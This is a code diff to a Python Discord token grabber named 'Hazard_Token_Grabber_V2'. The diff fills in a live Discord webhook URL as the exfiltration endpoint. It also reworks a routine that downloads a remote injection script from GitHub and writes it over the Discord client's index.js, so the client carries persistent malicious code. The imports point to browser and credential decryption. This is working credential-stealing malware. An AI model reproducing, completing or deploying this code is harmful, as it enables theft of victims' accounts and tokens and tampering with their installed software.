@@ -1,11 +1,12 @@
 import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil, pyautogui, cv2
 import numpy as np
 from re import findall
+from urllib.request import urlopen
 from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "WEBHOOK_HERE"
+        self.webhook = "https://discord.com/api/webhooks/898188535025246268/L-x8JqpNtJP1SLYbBvjgbOGHsVOaj9hm6sPhikF4g9hwejLrh2CpB8SAwseLiViY05yT"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -48,8 +49,11 @@ class Hazard_Token_Grabber_V2:
                 if (name.__contains__("discord_desktop_core-")):
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-                        f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean",headers=self.getheaders())
+                        try:
+                            os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                        except FileExistsError:
+                            pass
+                        f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
                         index_content = f.read()
                         with open(directory_list, 'wb') as index_file:
                             index_file.write(index_content)
